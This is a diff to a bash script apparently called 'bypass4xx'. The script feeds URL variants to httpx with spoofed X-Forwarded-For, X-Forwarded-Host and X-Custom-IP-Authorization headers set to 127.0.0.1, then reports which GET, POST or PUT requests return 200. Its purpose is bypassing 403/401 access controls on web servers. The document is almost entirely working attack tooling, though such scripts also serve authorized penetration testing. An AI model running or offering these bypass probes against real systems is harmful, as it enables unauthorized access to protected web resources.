@@ -1,7 +1,10 @@
 #!/bin/bash
 
+#if [ -z $1 ]; then echo "Usage: bypass4xx [URL]"; exit; fi
+
 urls=$(cat -)
 
+if [ -f 4xxpayloads ]; then rm 4xxpayloads; fi
 for url in $urls
 do
 echo "Doing $url"
@@ -122,9 +125,16 @@ else
         payloads+=("$(echo $url | sed 's/http/https/g')")
 fi
 
-echo ${payloads[*]} | tr ' ' '\n' > 4xxpayloads
+echo ${payloads[*]} | tr ' ' '\n' >> 4xxpayloads
 
-cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" | grep -v $conlen | grep "\[.*200.*\]"
-
-rm 4xxpayloads
 done
+
+echo "GET:"
+cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" | grep "\[.*200.*\]"
+
+echo "POST:"
+cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" -H "Content-length: 0" -x POST  | grep "\[.*200.*\]"
+
+echo "PUT:"
+cat 4xxpayloads | httpx -silent -status-code -content-length -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1" -H "Content-length: 0" -x PUT | grep "\[.*200.*\]"
+rm 4xxpayloads
